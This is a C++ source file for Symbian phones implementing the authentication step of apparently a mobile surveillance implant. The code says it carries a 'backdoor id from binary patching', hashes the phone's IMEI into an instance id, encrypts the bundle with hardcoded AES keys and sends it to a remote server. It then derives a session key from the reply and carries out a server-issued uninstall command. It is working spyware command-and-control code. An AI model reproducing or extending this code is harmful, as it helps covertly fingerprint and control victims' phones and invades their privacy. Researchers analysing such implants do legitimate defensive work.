/*
 * StateAuthentication.cpp
 *
 *  Created on: 13/feb/2011
 *      Author: Giovanna
 */

#include "StateAuthentication.h"
#include "Keys.h"
#include "StateCmdUninstall.h"
#include <HT\AES.h>
#include <HT\Phone.h>
#include <HT\RESTUtils.h>
#include <hash.h>
#include <random.h>


CStateAuthentication::CStateAuthentication(MStateObserver& aObserver) : CAbstractState(EState_Authentication, aObserver)
	{
	// prepare challengeKey/signature for AES
	iSignKey.Zero();
	for(TInt i = 0; i<32; i = i+2)
		{
		TLex8 lex(KAES_CHALLENGE_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		iSignKey.Append(val);
		}
	// prepare confKey for AES
	iConfKey.Zero();
	for(TInt i = 0; i<32; i = i+2)
		{
		TLex8 lex(KAES_CONFIG_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		iConfKey.Append(val);
		}
	}

CStateAuthentication::~CStateAuthentication()
	{
	delete iRequestData;
	delete iResponseData;
	}

CStateAuthentication* CStateAuthentication::NewLC(MStateObserver& aObserver)
	{
	CStateAuthentication* self = new (ELeave) CStateAuthentication(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateAuthentication* CStateAuthentication::NewL(MStateObserver& aObserver)
	{
	CStateAuthentication* self = CStateAuthentication::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateAuthentication::ConstructL()
	{
	}

void CStateAuthentication::ActivateL(const TDesC8& aData)
	{
	//construct body
	TBuf8<128> plainBody;
	
	TBuf<16> 	imei;
		
	// generate kd
	iKd.SetMax();
	TRandom::Random(iKd);
	plainBody.Append(iKd);
	
	// generate nonce
	iNonce.SetMax();
	TRandom::Random(iNonce);
	plainBody.Append(iNonce);
	
	// backdoor id from binary patching, ASCII
	plainBody.Append(KBACKDOORID);
	
	// generate instance id
	// 1. get IMEI
	CPhone* phone = CPhone::NewLC();
	phone->GetImeiSync(imei);
	CleanupStack::PopAndDestroy();
	// 2. SHA1 of IMEI
	TBuf8<16> imei8;
	imei8.Copy(imei);
	TBufC8<16> imeiC(imei8);
	CSHA1* sha1 = CSHA1::NewL();
	CleanupStack::PushL(sha1);
	sha1->Update(imeiC);
	TBuf8<20> instanceId;
	instanceId.Copy(sha1->Final());
	CleanupStack::PopAndDestroy(sha1);
	plainBody.Append(instanceId);
	
    // subtype
	TBuf8<16> subtype;
	subtype.Append(KSymbian_SubType);
    subtype.AppendFill(0,16-KSymbian_SubType().Length());
    plainBody.Append(subtype);
    
    //calculate final SHA1
    TBuf8<20> sha;
    CSHA1* payloadSha1 = CSHA1::NewL();
    CleanupStack::PushL(payloadSha1);
    payloadSha1->Update(KBACKDOORID);
    payloadSha1->Update(instanceId);
    payloadSha1->Update(subtype);
    sha.Copy(payloadSha1->Final(iConfKey));
    plainBody.Append(sha);
    CleanupStack::PopAndDestroy(payloadSha1);
    
    // encrypt plainbody
    RBuf8 buff(AES::EncryptPkcs5L(plainBody, KIV, iSignKey));
    buff.CleanupClosePushL();
    
    //add REST header
    HBufC8* header = iObserver.GetRequestHeaderL();
    TBuf8<32> length;
    length.Append(KContentLength);
    length.AppendNum(buff.Size());
    length.Append(KNewLine);
    iRequestData = HBufC8::NewL(header->Size()+length.Size()+KNewLine().Size()+buff.Size());
    iRequestData->Des().Append(*header);
    delete header;
    iRequestData->Des().Append(length);
    iRequestData->Des().Append(KNewLine);
    iRequestData->Des().Append(buff);
    CleanupStack::PopAndDestroy(&buff);
    
    iObserver.SendStateDataL(*iRequestData);
    }

void CStateAuthentication::ProcessDataL(const TDesC8& aData) 
	{
	//free resources
	delete iRequestData;
	iRequestData = NULL;
	
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check this
			iResponseData->Des().Append(aData);
			}
		return;
		}
	// parse response from server
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		//server answered with a redirect
		iObserver.ResponseError(KErrAuth);
		return;
		}
	//retrieve cookie
	HBufC8* cookie = CRestUtils::GetCookieL(*iResponseData);
	TBuf8<32> cookieBuf(*cookie);
	delete cookie;
	iObserver.SetCookie(cookieBuf);
	
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
	// first 32 bytes are Crypt(Signature,Ks)
	TPtrC8 crypt2 = body.Left(32);
	// retrieve Ks
	RBuf8 Ks(AES::DecryptPkcs5L(crypt2,KIV,iSignKey));
	Ks.CleanupClosePushL();
	// then calculate K=sha1(confKey,Ks,Kd), take only first 16 bytes of sha1
	CSHA1* sha1 = CSHA1::NewL();
	CleanupStack::PushL(sha1);
	sha1->Update(iConfKey);
	sha1->Update(Ks);
	TBuf8<20> keyK;
	keyK.Copy(sha1->Final(iKd));
	CleanupStack::PopAndDestroy(sha1);
	keyK.SetLength(16);
	CleanupStack::PopAndDestroy(&Ks);
	//set K key
	iObserver.SetKey(keyK);
	
	// last bytes are Crypt(K,Nonce | Response)
	TPtrC8 crypt3 = body.Right(body.Size()-32);
	RBuf8 plain(AES::DecryptPkcs5L(crypt3,KIV,keyK));
	plain.CleanupClosePushL();
	TBufC8<16> nonce(plain.Left(16));
	TBufC8<4> response(plain.Right(4));
	CleanupStack::PopAndDestroy(&plain);
	CleanupStack::PopAndDestroy(&body);
	//verify nonce
	if(iNonce.Compare(nonce)!=0)
		{
		iObserver.ResponseError(KErrAuth);
		return;
		}
	//verify response	
	if(response.Compare(KProto_Ok)==0)
		{
		// it's ok, let's go on
		iObserver.ChangeStateL();
		return;
		}
	if(response.Compare(KProto_No)==0)
		{
		iObserver.ResponseError(KErrAuth);
		return;
		}
	if(response.Compare(KProto_CmdUninstall)==0)
		{
		CAbstractState* uninstall = CStateCmdUninstall::NewL(iObserver);
		uninstall->ActivateL(KNullDesC8);
		return;
		}
	}

